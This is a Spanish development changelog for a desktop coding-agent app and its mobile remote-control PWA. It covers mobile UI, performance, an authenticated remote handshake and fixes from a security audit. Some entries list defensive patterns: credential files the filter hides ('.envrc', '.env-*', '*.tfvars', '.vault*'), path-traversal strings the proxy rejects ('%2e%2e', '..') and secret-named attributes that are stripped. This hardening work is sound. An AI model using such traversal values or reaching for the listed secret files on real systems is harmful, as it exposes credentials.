Code deja de ser la interfaz de escritorio comprimida: en la superficie `remote` (PWA) tiene su propia estructura de una columna. Mac y Windows no cambian (los snapshots existentes siguen igual).

- **Estructura** (`MobileCode.tsx`, `mobile-store.ts`): lista de sesiones (proyecto abreviado con `~`, «Nueva sesión», menú «⋯» por sesión en una hoja: renombrar/fijar/archivar/eliminar) → conversación (MessageStream + Composer) con barra superior (volver, título, detener, Cambios, Archivos, más). `CodeWorkspace` solo entra aquí con `isRemoteSurface()`.
- **Hojas** (`components/mobile/Sheet.tsx`, **provisional**: stub mínimo hasta que se integre el de T7; al integrar se toma SIEMPRE la versión de T7): Cambios y Archivos a pantalla completa; ModelPicker, EffortPicker, modo de permisos, adjuntar y las confirmaciones en línea (`ConfirmButton`) como hoja.
- **Cambios**: lista a pantalla completa con ruta abreviada con `~` → diff unificado con ajuste de línea (nuevo `wrap` en `DiffView`, botón para apagarlo), «Descartar este bloque» de 44 px con la confirmación de siempre, commit con mensaje. Los encabezados de bloque ya no ensanchan la tabla.
- **Archivos**: árbol táctil (filas de 48 px, menú «⋯» por fila), visor de solo lectura con resaltado ligero y la ruta abreviada, crear/renombrar/borrar de UN archivo; carpetas = «se confirma en el Mac» (con aviso y «Esperando tu confirmación en el Mac…»). «Abrir en…» ya no se ofrece en el celular (`editors:open` es X).
- **Composer**: barra de 44 px (adjuntar, @, detener, enviar) y una fila de modelo/esfuerzo/permisos que se oculta con el teclado; Enter = salto de línea; tocar un botón no quita el foco del campo (si no, la barra se movía y se perdía el toque); adjuntos con `<input type=file accept="image/*,application/pdf,text/*">` y otro con `capture` para la cámara → partes `data:` con los límites de `lib/attachments.ts` (nunca `file://`: `doSend` filtra por si acaso); cola de mensajes con botones de 44 px.
- **Permisos**: solo «una vez»/«rechazar» (nunca «siempre»); los tipos que el Mac confirma (`external_directory`, `doom_loop`, desconocidos) muestran «Apruébalo en el Mac» y solo permiten rechazar. La regla vive en `src/shared/remote/mac-confirm.ts`; `mac-confirm-parity.test.ts` la compara con `decide()` de la política real.
- **Navegador del agente**: `BrowserSnapshotView` (solo vista: `browser:state` + `browser:capture`, ambos R en la política); sin barra de URL ni toque.
- **CSS** (`mobile.css`, colgado de `[data-surface='mobile']`): lo que solo aparece con hover se ve siempre, botones de acción de mensaje de 44 px, letra de 16 px en campos (iOS no amplía la página), diálogo de confirmación con botones de 44 px. «Ir al final» sube a 44 px.
- **Pruebas** (nuevas): ruta abreviada, qué acciones piden el Mac (y paridad con la política), límites de adjuntos y `file://`, ajuste de línea del diff, tarjeta de permisos en ambas superficies, escritorio sin cambios.
- **Sin verificar**: nada con un iPhone/Android real (teclado virtual, `capture`, HEIC/fotos > 5 MB que se rechazan sin reducir, gestos); verificación visual solo con Chromium (390×844 y 360×800, claro/oscuro) y un arnés desechable (núcleo real + motor falso, WebSocket en vez de WebRTC).

## F8-B60 — Celular integrado: una sola navegación y una sola cabecera (rama `feat/remoto-movil-reconciliar`)

Reconcilia el armazón (F8-B58) con Code para celular (F8-B59), que se habían hecho por separado y duplicaban cabeceras y listas. Mac y Windows no cambian (snapshots y pruebas existentes intactos).

- **Reparto**: el armazón (`MobileShell`) es dueño de la pila de navegación y de la ÚNICA barra superior. En Code, la lista de sesiones es la del armazón (`CodeSidebar`); el detalle monta solo la conversación (`ChatColumn` + compositor), sin lista ni barra propias. Se eliminan `mobile-store.ts`, `MobileToolbar`, `MobileCodeLayout` y la pantalla de sesiones de T8.
- **Barra única de Code**: título de la sesión, rama + ruta como subtítulo y acciones Cambios, Archivos y «⋯» (44 px). En la lista: «proyectos recientes» y «+». Detener sigue en el compositor (ya tenía su botón de 44 px).
- **Cambios, Archivos y navegador del agente** son pantallas de la pila (`code:changes|files|browser`) a pantalla completa con su título en la barra única; el menú «⋯» es una hoja que también es una entrada de la pila (`code:actions`). La conversación queda montada debajo (conserva scroll y borrador). El gesto/botón «atrás» las cierra antes de volver a la lista.
- **Historial** (`nav-history.ts`): siempre hay `profundidad − 1` entradas propias de la pestaña activa; al cambiar de pestaña con la pila apilada se retiran con `history.go(-n)` (su `popstate` se ignora) y se reponen al volver. Antes el primer «atrás» desde la raíz podía no hacer nada.
- **Cabeceras duplicadas** de Rutinas y de Proyectos (selector de carpeta) eliminadas en el celular; Rutinas conserva el resumen y «Nueva» en una fila fina. Cerrar o cambiar de proyecto devuelve Code a su lista.
- **Zona segura**: el armazón es el único que añade el margen inferior (`--sab`, que se anula con el teclado) y el superior; se quitaron los de `Composer` y `ChangesPanel` que se sumaban.
- **Hallazgos de F8-B58/59**: (1) con la cola abierta la altura de la lista cambia sin que se vuelva a pegar al final → ahora, en el celular, un `ResizeObserver` mantiene el final visible si ya estaba pegado; (2) un permiso/pregunta nuevo lleva siempre la lista al final aunque hayas subido. Solo en superficie remota. Pendiente: las hojas modales sueltas (menú «⋯» de una sesión, selector de modelo) no tienen entrada en el historial: «atrás» con una abierta desapila la pantalla de debajo.
- **Peso de la PWA** (`scripts/build-pwa.mjs`, ahora cuenta también el CSS `boot-*.css` y muestra los perezosos): arranque 391,1 KB gzip (el recuento anterior omitía 16,6 KB de CSS: 374,5 KB con el método viejo); perezosos 150,1 KB (Ajustes 35, Tareas 34,8 + lista 9,8, inglés 50, Rutinas 10,6…). Cambios/Archivos no se pueden separar sin tocar el diseño de escritorio (lo importa de forma estática).
- **Pruebas**: `nav-history.test.ts`, `MobileShell.render.test.tsx` (una cabecera y una lista, Cambios/Archivos en la pila, atrás, cambio de pestaña, cerrar proyecto) y navegación (`replace`, `resetTab`). Verificación visual desechable con Chromium (390×844 y 360×800, claro/oscuro) sobre el núcleo real y un motor falso; no se deja en el repo.
- **Sin verificar**: nada en iPhone/Android reales (gesto atrás del sistema, teclado virtual, zona segura real); en Chromium el «atrás» se probó con `history.back()`.

## F8-B62 - Hojas, diálogos y avisos del celular (HOJAS)

- `Sheet.tsx`: salida animada 220 ms (`animate-sheet-down` + velo `animate-fade-out`), entrada 320 ms con `--ease-sheet` (`animate-m-sheet-up`), temporizador de cierre seguro de 300 ms que se cancela si se reabre, velo con `--m-backdrop` que baja al arrastrar, vuelta animada al soltar, asa 36x5, radio `--m-radius-sheet`, título centrado.
- `PopoverPanel` y `ModelPicker` (celular) pasan `open` a la hoja para animar la salida; el escritorio no cambia. Selector de modelo: filas y cabeceras con atributos `data-model-*` (CSS móvil).
- `ConfirmDialog`: atributos `data-confirm-*` solo en el celular; CSS en `features/code/impl/mobile.css` (scrim `--m-backdrop` también en oscuro, botones apilados de 50 px). `RemoteConfirmHost`: detalle con tope y scroll, botones siempre visibles.
- `components/mobile/Toast.tsx` (`showToast`, `MobileToastHost`); el host lo aloja `ConfirmDialogHost` (no pinta nada en escritorio).
- Nota: `--animate-sheet-up` global no se cambia (lo vigila `desktop-unchanged.test.tsx`); la hoja usa `--animate-m-sheet-up`.

## F8-B63 — Capa ligera de la PWA (arranque, vinculación, PIN, carga)

- `pwa/src/ui.ts`, `style.css`: columna de estado común (88 px, pilas `.stack`), pasos numerados de vinculación, código en 6 casillas, teclado de PIN propio (teclas de 72/64 px, envío automático, dos pasos al crear con `lock.set.again`, sacudida en error, cuenta atrás, el PIN solo vive en memoria; lógica pura en `src/shared/remote/pin-pad.ts`), pastilla de reconexión flotante (única: oculta con la interfaz completa montada; la de «esperando al Mac» queda bajo la cabecera), esqueleto del armazón al cargar, lista de respaldo agrupada por fecha con aviso y «Reintentar», toast con salida suave.
- Rendimiento: P1-1 (`prefetchFullApp`: `modulepreload` durante WebRTC/PIN, `entry.json` v1/v2 con `preload` y `bootCss`, una sola lectura), P1-2 (`remote/main.tsx` no espera `settings:get` si hay `onyx.langPref`), P1-5 en `main.ts` (`hiddenAt`; pasa el tiempo oculto a `client.wake(away)`).
- Pruebas: `pin-pad.test.ts`, `pwa-i18n.test.ts`, `remote/full.test.ts`.

## F8-B61: armazón y listas del celular (SHELL)

- Barra inferior de 56 px con píldora activa (tocar de nuevo la pestaña activa sube al principio, oculta con el teclado abierto), cabecera de 52 px con título grande en las listas y filete solo al desplazar, transiciones de pila y pestañas con dirección (`fill-mode: backwards`, sin animación tras el gesto atrás del navegador), foco al `<h1>` tras apilar/desapilar, zona segura lateral y desplazamiento de cada lista recordado.
- Aviso de conexión único (reconectando / sin conexión / «Conectado de nuevo» 1,8 s) con región viva; `modeFor` de la capa ligera ya no deja la pantalla vacía mientras carga la interfaz.
- «Más», «Este celular» y Ajustes como listas agrupadas (`ListGroup`/`ListRow`), pie «Se aplica también en tu Mac» en tema e idioma.
- Lista de conversaciones: búsqueda visible, filas de 56 px, cabeceras fijas, estado vacío con «Nuevo», `SwipeRow` (nunca borra con el gesto: pide confirmación) y pulsación larga; mismo gesto en las sesiones de Code; menú de Tareas anclado abajo (no se sale a 360 px); esqueleto en lugar de `null` en las pantallas `lazy/`.
- Pruebas nuevas: `shell-logic`, `MobileShell.chrome`, `MoreScreens.render`, `SwipeRow`, `MobileSessionList.render`. El escritorio no cambia.

## F8-B64 — Conversación móvil (Chat y Code en la PWA)

- Scroll con intención táctil (`use-stick-to-bottom.ts`: `touchstart` suelta el pegado, `touchend`/`scrollend` reasientan, salto previo en distancias largas con `jumpTarget`); «Ir al final» de 40 px con punto de contenido nuevo.
- El Chat ya no abre el teclado al entrar; compositor en píldora de 24 px, botones de 36 px, altura máxima 38 % de lo visible (`mobileComposerMax`), pie de modelo en segunda fila sin foco; saludo vacío con sugerencias en fila. Code: píldora de 24 px y botones de 36 px.
- `app/mobile/conversation.css` (todo bajo `[data-surface='mobile']`): respuesta 16/1.6, metadatos 14, código 13 con scroll horizontal, tablas, burbuja del usuario; ganchos `m('user-bubble'|'meta'|'pending-card')`. Columna con gutter de 16 px.
- Herramientas: Chat reutiliza `ToolRow` (sin JSON crudo); filas de 44 px, sin sangría al expandir, salidas a `40dvh`.
- Mantener pulsado (`use-long-press.ts`, `MessageActionsSheet`) con Copiar / Seleccionar texto / Editar / Reintentar / Bifurcar / Revertir; acciones visibles solo bajo la última respuesta.
- Tarjeta de permiso: Rechazar a la izquierda y Permitir a la derecha; `PendingBar` «Aprobación pendiente»; indicador único de «pensando» (`ThinkingIndicator` movido a `components/conversation`); visor de imágenes; botones táctiles en `ErrorNotice`; `DeferredMarkdown` (`useDeferredValue` en streaming); las filas del historial ya no animan al cargarse.
- Escritorio sin cambios (snapshots intactos). Pruebas: `use-stick-to-bottom`, `viewport`, `use-long-press`, `conversation`, `ChatComposer.mobile`, `ChatMessageList.mobile`, `MessageStream.mobile`, `MobileCode.render` (ampliada). Pendiente: P1 `legacyCopy` (P2-B) y P2-C (medir en iPhone real).

## F8-B65: rendimiento de la PWA móvil (arranque 391 → 269 KB gzip)

- **Resaltado perezoso** (`components/highlight-plugins.ts`, `remote/shims/highlight-lazy.ts`, `hljs-deferred.ts`): `rehype-highlight` y highlight.js salen del arranque; se bajan en un rato ocioso tras pintar. El escritorio sigue con la versión estática.
- **Sin código de escritorio** vía `remote/swaps.ts` (Sidebar, CommandPalette, UpdateNotice, RemotePairHost, RemoteConfirmHost, `keybindings/dispatch`). Prueba `swaps.test.ts`: cada SWAP existe, el especificador está escrito tal cual en el importador y el shim exporta lo que ese importador usa (un SWAP mal escrito ya no falla en silencio).
- **Paneles Cambios/Archivos/Navegador y Markdown perezosos** (`remote/lazy/*`, con esqueleto o texto plano de respaldo).
- **Diccionario `es` partido** (`i18n-split.ts`, `i18n-core-keys.json`, `registerMessages`): `main` pasa de 60 a 21 KB gzip; el resto (~31 KB) lo bajan Ajustes/Tareas/Rutinas, y un `t()` sin clave en el núcleo baja el resto y repinta. Prueba obligatoria `i18n-core.test.ts` (recorre el grafo de la build y exige cobertura de claves; núcleo + resto == área original). Regenerar: `UPDATE_PWA_I18N=1 npx vitest run src/renderer/remote/i18n-core.test.ts`.
- **Markdown por bloques memoizados** mientras se escribe (`splitMarkdownBlocks`; plan B ante referencias, notas y HTML; análisis completo al terminar). Pruebas de equivalencia con prefijos (`Markdown.blocks.test.tsx`) y de coste (`Markdown.perf.test.tsx`, ~37x menos por delta).
- **Brillo «pensando»** en el celular con pulso de opacidad (compositor) en vez de `background-position`.
- `entry.json` v2 (`preload`, `bootCss`), marcas `onyx:*` y `__onyxPerf()`, presupuesto 300 KB (`pwa/budget.json`).

## F8-B66: protocolo v3 del control remoto, autenticación mutua ligada a las huellas DTLS (RECONEXION)

Cambio de seguridad. Plan: `scratchpad/plan-remoto-reconexion.md`; auditoría: hallazgos 3, 4, 6, 8 y 11 (el 2, aprobar `bash` «una vez» desde el celular, NO se toca: lo decide el dueño). Detalle y riesgo residual en `docs/SEGURIDAD.md` §3 tricies.

- **Paso previo verificado con la librería real**: libdatachannel (`node-datachannel` 0.33.4) comprueba la huella DTLS del SDP contra el certificado del par en los dos sentidos (`rtc-fingerprint.test.ts`: con una huella falsa en el offer o en el answer el canal no abre). Defensa en profundidad en `rtc.ts` (`remoteFingerprint()` contra el offer).
- **Handshake v3** (`src/shared/remote/handshake.ts`, TypeScript puro, HKDF/HMAC con `@noble/hashes`; vectores calculados aparte con Python): `hs1/hs2/hs3` en los dos modos, ninguna credencial viaja, el Mac prueba quién es (`proof` en `authed`/`pair-pending`/`auth-failed{expired}`) antes del PIN. Claves: `HKDF(sha256(secreto))` (los celulares ya vinculados siguen sirviendo) y `HKDF(q)` para el QR. Huellas estrictas (`sdpFingerprintStrict`: una sola `sha-256`, varias distintas = rechazo). Código de 6 dígitos con compromiso previo (commit-reveal).
- **H4**: intermediario, repetición, reflejo, compromiso roto, clave de relleno y huellas distintas o no `sha-256` probados en `handshake.test.ts`, `peer-session.test.ts` y `service.test.ts` (con el `ClientHandshake` real a través de tramas validadas en los dos sentidos).
- **H8** (`pairing.ts`): el `hello` lleva `qid`, un `qid` ajeno no consume el QR, 5 fallos lo anulan («El código QR se anuló tras varios intentos fallidos»), solo `hs3` correcto lo consume, un único intento en curso.
- **H11**: el plazo de validez se renueva al abrir el acceso (PIN o reconexión en caliente), no al presentar la clave.
- **H3**: el bloqueo (manual o por inactividad) cierra las suscripciones abiertas (`Mux.endSubs`, descarte de eventos en cola, `canEmit`); el cliente trata el `res` de error de una suscripción lista como cierre normal.
- **H6**: «Cortar todo» y «Quitar todos» borran «Recordar 12 h» y la actividad reciente.
- **Confirmación por conexión opcional**: ajuste «Pedir confirmación en el Mac en cada conexión» (apagado por defecto, `remote:setConfirmEach`) y política `requireConnectionConfirm` en `managed.json` (ausente `false`, valor raro o archivo inválido `true`). Un dispositivo sin PIN siempre confirma; vincular siempre se confirma. **Cambio de comportamiento a anotar en las notas de versión (es/en).**
- **PWA** (`client.ts`, `rtc.ts`): `q` no sale del celular, verifica la prueba del Mac antes de aceptar tramas o pedir el PIN, los fallos sin prueba no borran credenciales («No se pudo verificar tu Mac», «Tu Mac no reconoció este celular», «Vínculo caducado»), recarga automática una sola vez ante «versión incompatible» y `wake(awayMs)` (reconexión inmediata tras 15 s oculta; sondeo de 2 s).
- Protocolo `PROTOCOL_VERSION = 3`: `auth` desaparece, `hello` de vinculación con `qid`; una pestaña anterior recibe `version` (también con un `hello` de forma antigua). Auditoría `auth-bad-proof`.
- Docs: `docs/SEGURIDAD.md` (frase «solo viaja por DTLS» corregida; secciones B53–B60 reordenadas antes de §4 y renumeradas `vicies bis…novies` sin duplicados, B66 = `tricies`; las entradas anteriores de este changelog que citan «vicies ter/quater/quinquies» usan los nombres antiguos), `POLITICA-ORGANIZACION.md`, `REMOTO-FASE2.md`, `REMOTO-PRUEBA-MANUAL.md` (pasos 0–0f) y `AGENTS.md` §8.
- Pruebas: `handshake`, `protocol`, `pairing`, `peer-session`, `peer-session-access`, `service`, `service-access`, `devices-store`, `org-policy`, `audit`, `mux`, `events-hub`, `rtc-fingerprint`, `lan-server`. Pendiente: la prueba manual del dueño (iPhone ya vinculado, «Versión incompatible», vinculación nueva, «Bloquear ahora» con el chat abierto) y la comprobación de que el SDP real de Safari/Chrome cumple la huella estricta.

## F8-B67: arreglos de seguridad de la auditoría del control remoto

Corrige los hallazgos 1, 5, 7, 9, 10 y 12 de la auditoría del remoto v3 (el 2 —aprobar `bash`/`edit` «una vez» desde el celular— queda a decisión del dueño; 3, 6, 8 y 11 pendientes). Cada arreglo tiene una prueba que reproduce el ataque y fallaba antes (comprobado revirtiendo el código).

- **1**: el filtro de archivos sensibles cubre `tasks:previewFile`, `git:diff` (con `path` y filtrando la respuesta por bloques), `GET /vcs/diff`, `/vcs/diff/raw`, `/session/{id}/diff`, `/file/status`, `summary.diffs` y el evento `session.diff` (`diff-filter.ts`); lista ampliada con `.envrc`, `.env-*`, `.env_*`, `*.tfvars`, `.vault*`. Pruebas: `engine-proxy.test.ts`, `diff-filter.test.ts`, `path-guard.test.ts`.
- **5**: los diálogos muestran `patrones`, comando/rutas del permiso, reglas de sesión, prompt y horario de rutinas y contenido de AGENTS.md/memoria, con tope de 240 caracteres y 12 líneas, sin saltos ni secretos (`confirm-detail.ts`, también en `ConfirmQueue`). Pruebas: `policy.test.ts`, `confirm-queue.test.ts`, `engine-proxy.test.ts`.
- **9**: `settings:get`, `tasks:trusted:list` y `tasks:policy` salen sin `opencodeBin` ni rutas fuera del ámbito (`sanitizeResult` con predicado de ámbito).
- **10**: `git:createWorktree` pasa a X; `routines:delete/toggle(off)`, `tasks:tasks:forget` y `tasks:restore:forget` se acotan al ámbito; toda acción M ejecutada deja `action-run` (canal y clase) en `remote-audit.jsonl` (i18n es/en de la actividad).
- **7**: una llamada D idéntica a otra pendiente responde `busy` (una aprobación, una ejecución) y el digest se compara con el de lo que de verdad se ejecuta (IPC: payload validado en `authorize`, de un solo uso; HTTP: lo enviado al motor frente a una copia tomada al confirmar).
- **12**: `docs/SEGURIDAD.md` (§3 vicies marcada como histórica y corregida, nueva §3 tricies bis) y `docs/REMOTO-FASE2.md` (el secreto está en `localStorage`).
  Pendiente: `src/test/opencode-contract.test.ts` falla en este árbol por la instantánea de `api-routes.json` (ajena a esta tanda); prueba manual de los diálogos nuevos en el Mac.

## F8-B68: seguridad del navegador integrado y de «Abrir en el editor»

- **SSRF local**: `isLoopbackOrPrivateHost` clasifica por la IP real (`ip-class.ts`: IPv6 mapeada/NAT64/6to4, ULA, link-local, 0.0.0.0/8, CGNAT, multicast, metadatos de nube, `*.localhost`) y `webRequest` bloquea nombres que resuelven a IP local (anti-rebinding, salvo origen «siempre»).
- **Puerta de aprobación**: `window.open`/`target=_blank` pasan por `resolveNavigationApproval`; el bypass pasa de «por pestaña, 2 s/toda la carga» a URL exacta y un solo uso (`nav-bypass.ts`), así que las redirecciones a otro destino vuelven a pasar por la puerta.
- **`clipboard-sanitized-write`** solo para el origen https (o http local) de la página de nivel superior.
- **`dialog:openInEditor`**: `realpath`, contención al proyecto activo/reciente y `assertSafeToOpen` en los respaldos `open`/`openPath`.
- Pruebas: `session.test.ts`, `nav-bypass.test.ts`, `dialog/service.test.ts`. Detalle y límites (TOCTOU de DNS) en `docs/SEGURIDAD.md` §3 tricies ter. Pendiente: prueba manual en la app (redirección y `window.open` con el agente).

## F8-B69: seguridad de Tareas, MCP y credenciales (6 hallazgos de la revisión externa)

- **5**: `mcp:getConfig` y las respuestas/eventos de cambios de MCP entregan `headers`/`environment` enmascarados; `mcp:save` restituye el secreto guardado si el valor llega enmascarado.
- **6**: el token del MCP del navegador se revoca al terminar el servidor de Tareas (y un relanzamiento invalida el anterior). Los tokens siguen en el entorno de `opencode serve`: pendiente denegar `process-info` en Seatbelt o un proxy MCP (no se tocó `sandbox*`).
- **7**: `tasks/host-rules.ts` valida `setHost(allow)` y `allowOnce` (sin TLD, sufijos públicos, comodines amplios ni IP privadas).
- **8**: `pty:create` con lista cerrada de shells (`ipc/pty-shell.ts`) y `cwd` absoluto sin `..`.
- **9**: `CredentialProxy` normaliza y rechaza `..`, `%2e%2e`, `//`, `\` y doble codificación antes de reenviar.
- **10**: revocación del token del navegador y patrón/secretos exactos en el redactor de Diagnóstico.
- Pruebas nuevas en cada ruta (ver `docs/SEGURIDAD.md` §3 tricies quater). Pendiente: prueba manual del formulario de MCP con valores enmascarados.

## F8-B70: preparación de publicación sin credenciales (columna A del plan)

Todo lo que se podía dejar listo sin certificados, claves ni repositorio; nada empaquetado, notarizado ni subido. Pruebas: `npm run test:release-scripts` (node:test con dobles) y vitest en `src/main/update`.

- **Firma** (`build/sign-common.js`, `notarize.js`, `notarize-dmg.js`, `electron-builder.js`): notarización con clave API (`APPLE_API_KEY` ruta del `.p8` + `APPLE_API_KEY_ID` + `APPLE_API_ISSUER`, prioritaria) o Apple ID; credenciales a medias fallan nombrando lo que falta; el `.dmg` se notariza y graba con `notarytool` + `stapler` (hook `afterAllArtifactBuild`; la contraseña de app viaja como `@env:`); con Developer ID los helpers `cu-helper` y `onyxcode-disclaim` se vuelven a firmar con `HELPER_ID`/`DISCLAIM_ID` + hardened runtime antes de notarizar (el camino autofirmado conserva sus argumentos exactos). Con `CSC_LINK` hace falta además `CSC_NAME`. Pruebas: `scripts/release-build.test.mjs`.
- **`npm run verify:signed`** (`scripts/verify-signed.mjs`, `--expect adhoc|self|devid`, `--dry-run`): codesign, identificadores, runtime, `spctl` y `stapler`. Contra el `dist/` actual detecta que `cu-helper` y `onyxcode-disclaim` llevan identificador derivado (build anterior al gancho).
- **Actualizador** (`src/main/update`): `UPDATE_TEAM_ID` en `config.ts` (vacío = sin cambio; con valor, `codesign -R` del equipo y falla cerrado si está mal formado; en `src/shared/brand.ts` no se tocó), `updateKeys` extra en `resolveInstallConfig` (rotación), canal beta como lógica pura (`channel.ts`, `UpdateChecker({channel})`, sin interfaz) y publicación en dos pasos: `publish-update.mjs --manifest-only` + `scripts/sign-update.mjs` (comprueba tamaño/SHA-256/appId/keyId/clave y firma en el Mac del dueño). Pruebas: `manifest-two-step`, `installer-team`, `channel`, `checker`.
- **CI** (`.github/workflows`): `ci.yml` sin secretos ni E2E; `release.yml` solo crea un BORRADOR, con entorno `release` de aprobación manual, permisos mínimos y acciones fijadas por SHA; la clave Ed25519 no está. Guardias en `scripts/workflows.test.mjs`.
- **Docs y avisos**: `docs/RELEASE.md` (checklist, rollback siempre hacia delante, rotación de claves y de certificado), `docs/DISTRIBUCION.md` (clave API, `.dmg`, `verify:signed`, SmartScreen/Windows), `CHANGELOG.md` + `scripts/release-notes.mjs` (cuerpo de la release), `scripts/rename-app.mjs --dry-run` (solo simula) y `THIRD_PARTY_NOTICES.md` alineado con `LICENSE` (MIT) con la comprobación en `verify:release` (que además dejó de dar un falso positivo con `swap.sh`).
  Pendiente: lista de claves en `brand.ts` y su cableado en `ipc/update.ts`, `validateManifest` con prereleases y la opción de Ajustes del canal beta (fuera del alcance de esta tanda: `src/shared`, `src/main/ipc`, interfaz); confirmación de licencia y nombre por el dueño; todos los pasos de la columna B.

## F8-B71: elegir un elemento del navegador y enviarlo al chat (lado main, `PickedElement` v2)

- **Contrato** (`src/shared/ipc-browser.ts`): `PickedElement` pasa a `v: 2` con `selector` único y robusto, `path` (migas de pan de hasta 4 ancestros), `html` saneado ≤ 4 KB, `styles` (lista cerrada `PICK_STYLE_PROPS`, ≤ 40, sin valores por defecto ni `url()`), `rect` + `viewport {width,height,dpr}`, `url` sin query ni fragmento, `title`, `image?` (JPEG recortado al elemento, lado largo ≤ 800 px y ≤ 300 KB), `diagnostics?` (últimos 10 errores de consola y 10 de red con `status >= 400` o `net::ERR_…`, ≤ 3 KB) y `flags {sensitive, truncated}` + `redactions`. Topes en `PICK_LIMITS`. `browser:picked` conserva nombre y carga `{owner, tabId, element}`: **ningún canal IPC nuevo**, ningún método CDP nuevo (`ALLOWED_CDP` idéntica, fijada por hash en `pick.test.ts`) y el preload `browser-host` queda con el mismo SHA-256 (`0bcc0e0b…daed73` antes y después de `electron-vite build`; no importa nada de `@shared`).
- **Saneado doble**: en la página (`pick-script.ts`, `pickInPage`, mundo aislado, serializa sin tocar el DOM) y en main (`pick.ts`, `sanitizePickedHtml`, puro e idempotente). Nunca salen: `value=`/`checked`/`selected`, el texto de un `<textarea>`, `input[type=password|hidden]` ni `autocomplete=cc-*|one-time-code|current-password|new-password` (se sustituyen por `<input type="…" data-onyx-redacted>`), `on*`, `srcdoc`, `nonce`, `integrity`, `style`, `srcset`, atributos con nombre de secreto (`token|secret|key|auth|pass|csrf|…`), query/fragmento de `href/src/action/…`, `data:`/`blob:`/`javascript:` reducidos, `<script>/<style>/<template>/<noscript>`, trazados de `<svg>` ni comentarios. Todo texto y valor de atributo pasa por `redactSecrets`. Un elemento que es o contiene un campo sensible, o un campo con texto escrito, marca `flags.sensitive` y no lleva captura. Profundidad 4 y 20 hijos por nodo (los aplica la página; main repite el tope de 4 KB, cortando en una etiqueta completa).
- **Captura** (`planElementClip`/`captureElementImage`): `Page.captureScreenshot` con `clip` (margen de 8 px, scroll sumado) tras apagar el resaltado; calidad 80 y, si pesa > 300 KB, 60; si aun así no cabe, sin imagen. Se omite con área 0, lado corto < 8 px o `sensitive`.
- **Diagnóstico** (`pick-diagnostics.ts`, nuevo, en vez de ampliar los búferes de `tools.ts`): se activa al entrar en el modo selección y solo escucha eventos (`Runtime.consoleAPICalled`, `Runtime.exceptionThrown`, `Log.entryAdded`, `Network.*`; `Runtime/Log/Network.enable` ya estaban permitidos). Se descarta lo anterior a la activación aunque `Runtime.enable` lo reenvíe.
- **Servicio** (`service.ts`): `setPicking` no arranca si `control === 'agent'` y la selección se cancela al navegar (primer nivel), cambiar o cerrar la pestaña, ocultar el panel, abrir una pestaña nueva o cuando el agente toma el control; Esc cancela (`before-input-event` en `surface.ts`, `isCancelKey` en `keys.ts`; se traga la tecla solo si hay selección). Un elemento dentro de un marco avisa con `merr.browser.pickIframe` (es/en). Antes de emitir, main valida el elemento con `PICKED_ELEMENT_SCHEMA` (`src/main/ipc/schemas.ts`, estricto; no es un canal invoke).
- **OpenCode 1.18.33 fijado** (lectura del paquete, sin ejecutar modelos): el esquema de `TextPart` guarda `synthetic`, `ignored` y `metadata: Record<string, any>`; el propio TUI envía partes de texto `synthetic:true` con `metadata` (`kind:"editor_context"`) para el modelo y no se vio ningún filtro de `synthetic` al construir los mensajes del modelo (solo la interfaz y el título de la sesión las ignoran). Conclusión: las partes sintéticas con `metadata` son viables; plan B documentado (marcador `[Elemento de la página]` en la primera línea) por si una prueba real lo desmiente.
- Pruebas: `embedded-browser/pick.test.ts` (saneado, idempotencia, topes, esquema, hash de `ALLOWED_CDP`), `pick-script.test.ts` (la función serializada, sobre un DOM de prueba), `pick-diagnostics.test.ts`. Sin E2E (no se abrió Electron).

## F8-B72: elegir un elemento del navegador y enviarlo al chat (lado interfaz)

- **Chip en el compositor** (Code y Tareas; `features/browser/ElementChip.tsx`, `ElementDetailPopover.tsx`): etiqueta `<tag> selector corto`, `host · ancho×alto`, insignia «N errores», botón quitar y detalle con selector, ruta (con «Copiar»), HTML saneado, estilos, captura y diagnóstico. Casillas «Incluir captura» e «Incluir errores de consola y red» (marcadas por defecto; con `flags.sensitive` la captura nunca se incluye y su casilla queda desactivada); avisos «Se omitieron N datos» y de campos sensibles. El texto del compositor ya no se rellena: el elemento es un adjunto (`Attachment` pasa a unión archivo | elemento; máx. 3 elementos por borrador). Región `aria-live` («Elemento añadido»), `role="dialog"`, foco al abrir y al cerrar, Esc cierra solo el detalle. En el celular el detalle es una hoja (`PopoverPanel`).
- **Envío** (`element-context.ts`, `doSend` de Code y `sendToTask`): una parte de texto `synthetic:true` con `metadata:{kind:'browser_element', v:2}` cuyo texto empieza EXACTAMENTE con `[Elemento de la página]` (plan B acordado: la burbuja también lo reconoce solo por el marcador) con url, selector, ruta, HTML, estilos y diagnóstico, ≤ 8000 caracteres (recorta HTML, luego estilos y diagnóstico); y la captura como parte `file` `data:image/jpeg` solo si la casilla está marcada y el elemento no es sensible (tope de `PICK_LIMITS.imageBytes`). Las etiquetas del bloque son fijas en español (es un prompt, no cambia con el idioma de la interfaz). Reintentar/editar un mensaje conserva el bloque. Desde el celular (política `{type,text}` del remoto) el bloque sale sin `synthetic`/`metadata`.
- **Burbuja del usuario** (Code, Chat y Tareas, escritorio y celular): chip compacto `<tag> selector · host` con el mismo detalle de solo lectura; el volcado nunca se pinta y una parte sintética sin el marcador sigue oculta.
- **Selección**: aviso bajo la barra («Haz clic en un elemento… · Esc para cancelar»), botón desactivado con el agente en control (`title` según el estado), Esc con el foco en la interfaz llama a `browser:pick {on:false}` (sin disparar «detener» del agente) y enviar un mensaje la apaga (`pick-state.ts`).
- Textos es/en `browser.pick.*`, `browser.element.*`, `browser.url.pickCancel` (más `i18n-core-keys.json` de la PWA); `ElementChip` y `ElementDetailPopover` en `MIGRATED`.
- Pruebas: `element-context.test.ts` (saneado que llega al texto, tamaños, `include`, `flags.sensitive`, lectura inversa), `ElementChip.render.test.tsx`, `pick-state.test.ts`, `MessageStream.element.render.test.tsx` (Code y Chat), `store.element.test.ts` (partes enviadas, celular), `tasks/impl/elements.test.ts`. Sin E2E ni Electron.
- Pendiente: Chat no tiene navegador (el dueño del evento es Code o Tareas), así que su compositor no recibe elementos; solo muestra el chip en la burbuja. Editar y reintentar en Tareas no reenvía el elemento. Prueba manual en la app (clic real, foco del popover, hoja del celular).

## F8-B73: distribución gratuita para macOS (instalador, tap de Homebrew y guía)

